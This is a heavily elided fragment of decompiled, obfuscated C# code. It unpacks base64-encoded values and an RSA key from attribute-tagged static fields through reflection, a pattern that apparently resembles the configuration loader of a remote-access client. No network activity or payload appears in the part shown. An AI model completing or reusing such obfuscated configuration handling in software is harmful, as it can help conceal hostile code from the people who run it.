...
internal class AsyncSendWorker
{
	...
	private static PacketStreamAdapter class19_0;

	internal static DateTime dateTime_0;

	static AsyncSendWorker()
	{
		string_1 = "73HWrM6iCrk=";
		class19_0 = new PacketStreamAdapter();
		...
		class2.method_1(Convert.FromBase64String(HeartbeatMonitor.string_2));
	...
	{
		string_2 = null;
		FieldInfo[] fields = typeof(TransmissionController).GetFields(BindingFlags.Static | BindingFlags.Public);
		foreach (FieldInfo fieldInfo in fields)
		{
			if (fieldInfo.GetCustomAttributes(typeof(SerializableAttribute), false).Length > 0)
			{
	...
	internal static void smethod_1(out string string_2)
	{
		...
		foreach (FieldInfo fieldInfo in fields)
		{
			if (fieldInfo.GetCustomAttributes(typeof(AliasAttribute), false).Length > 0)
			{
				string_2 = (string)fieldInfo.GetValue(null);
			}
		}
		string_2 = smethod_2(string_2 + "");
		ConnectionThrottle.rsacryptoServiceProvider_0.FromXmlString(string_2);
	}
	...
	internal static void smethod_5(HeartbeatMonitor class29_0, string[] string_2)
	{
		class29_0.string_0 = string_2[0];
		class29_0.string_1 = string_2[1];
	}

	internal static void smethod_6(HeartbeatMonitor class29_0, string string_2)
	{
